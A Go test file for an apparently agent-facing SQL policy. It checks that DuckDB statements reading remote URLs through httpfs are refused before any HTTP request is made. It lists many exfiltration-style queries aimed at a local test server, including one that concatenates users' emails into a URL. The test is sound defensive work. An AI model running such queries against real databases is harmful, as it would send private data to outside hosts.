package agents

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/vibe/internal/session"
)

// TestPolicy_NoRequestBeforeThePrecheck is spike finding B: the classifier's own
// EXPLAIN binds the statement, and binding sniffs files and sends HTTP
// requests. With httpfs loaded, a denied read_csv('http://...') must reach the
// listener zero times: the syntactic pre-check refuses it before EXPLAIN runs.
//
// It needs the httpfs extension on disk (the integration suites cache it in
// the temp directory); it skips when that is not available. A control request
// proves the listener sees what httpfs sends.
func TestPolicy_NoRequestBeforeThePrecheck(t *testing.T) {
	extDir := filepath.Join(os.TempDir(), "vibe-conn-it-ext")
	if m, _ := filepath.Glob(filepath.Join(extDir, "v*", "*", "httpfs.duckdb_extension")); len(m) == 0 {
		t.Skip("httpfs is not in the shared extension cache; run the integration suites once to fetch it")
	}
	var hits atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		w.Header().Set("Content-Length", "4")
		w.WriteHeader(http.StatusOK)
		if r.Method != http.MethodHead {
			_, _ = w.Write([]byte("a\n1\n"))
		}
	}))
	t.Cleanup(srv.Close)

	fx := newPolicyFixture(t, ModeFull, withExtDir(extDir))
	if err := session.EnsureExtension(context.Background(), fx.db, "httpfs", "the policy test"); err != nil {
		t.Skipf("httpfs could not be loaded: %v", err)
	}

	// Control: binding really does make a request on this hub.
	rows, err := fx.db.Query("EXPLAIN SELECT * FROM read_csv('" + srv.URL + "/control.csv')")
	if err == nil {
		rows.Close()
	}
	if hits.Load() == 0 {
		t.Skip("httpfs made no request at bind time here, so this test cannot prove anything")
	}
	hits.Store(0)

	for _, q := range []string{
		"SELECT * FROM read_csv('" + srv.URL + "/leak.csv?d=secret')",
		"EXPLAIN SELECT * FROM read_csv('" + srv.URL + "/leak.csv')",
		"SELECT * FROM read_text('" + srv.URL + "/leak.txt')",
		"SELECT * FROM '" + srv.URL + "/leak.csv'",
		"DESCRIBE '" + srv.URL + "/leak.csv'",
		"SUMMARIZE '" + srv.URL + "/leak.csv'",
		"INSERT INTO t SELECT * FROM read_csv('" + srv.URL + "/leak.csv')",
		"CREATE TABLE leaked AS SELECT * FROM read_csv('" + srv.URL + "/leak.csv')",
		"SELECT * FROM read_csv('" + srv.URL + "/' || 'leak.csv')",
		"SELECT * FROM query('SELECT * FROM read_csv(''" + srv.URL + "/leak.csv'')')",
		"CREATE VIEW vleak AS SELECT * FROM read_csv('" + srv.URL + "/leak.csv')",
		"COPY (SELECT * FROM read_csv('" + srv.URL + "/leak.csv')) TO '" + fx.p("o.csv") + "'",
		"CREATE TABLE stolen AS UNPIVOT '" + srv.URL + "/leak.csv' ON COLUMNS(*) INTO NAME k VALUE v",
		"CREATE VIEW vp AS UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v",
		"CREATE MACRO mp() AS TABLE UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v",
		"CREATE TABLE a AS SELECT 1 FROM t2 WHERE EXISTS (UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v)",
		"INSERT INTO t2 UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v",
		"COPY (UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v) TO '" + fx.p("o.csv") + "'",
		"CREATE TABLE a AS PIVOT '" + srv.URL + "/leak.csv' ON a USING sum(b)",
		"CREATE TABLE zz AS SELECT * FROM t2 ORDER BY '" + srv.URL + "/leak.csv'",
		"SELECT * FROM t2 WHERE EXISTS (UNPIVOT '" + srv.URL + "/leak.csv' ON a INTO NAME k VALUE v)",
	} {
		v := fx.classify(q)
		assert.Equal(t, sqlClassOther, v.Class, q)
		resp := fx.run(q)
		require.NotNil(t, resp.Error, q)
	}
	assert.Zero(t, hits.Load(), "a denied statement must never make an HTTP request, not even from the classifier's own EXPLAIN")

	// And the exfiltration the issue describes, with data from a table.
	resp := fx.run("SELECT * FROM read_text('" + srv.URL + "/?d=' || (SELECT string_agg(email, ',') FROM users))")
	require.NotNil(t, resp.Error)
	assert.Zero(t, hits.Load())
}
